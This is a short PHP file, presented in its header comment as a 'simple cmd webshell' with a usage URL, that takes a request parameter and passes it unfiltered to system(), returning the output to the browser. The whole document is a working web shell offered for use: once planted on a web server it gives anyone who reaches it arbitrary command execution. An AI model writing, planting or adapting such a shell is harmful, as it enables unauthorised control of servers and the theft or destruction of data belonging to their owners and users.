<!--
Simple cmd webshell
Coded by: Userx
Usage example: http://localhost/php-cmd-shell.php?var1=ls
-->

<?php

if(isset($_REQUEST['var1'])){
        echo "<pre>";
        $cmd = ($_REQUEST['var1']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

